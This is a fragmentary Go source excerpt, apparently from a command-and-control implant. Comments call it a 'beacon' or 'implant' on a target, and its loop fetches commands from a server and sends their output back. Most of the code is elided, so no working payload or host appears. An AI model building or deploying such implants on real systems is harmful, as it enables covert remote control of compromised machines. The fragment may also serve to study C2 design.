...
Client is our API client, not our callback client. Think of this more like a beacon, or an "implant" that is embedded on the target in some way.
*/
...
func main() {
	...
	for {
		...
		req.Uuid = uuid
		//a bit of a misnomer, it is more similar to FetchCommand instead of SendCommand, but I'll fix it later.
		...
		//send to the client
		client.SendOutput(ctx, cmd) //when a command is issued, it sends the output back to the server
	}
}
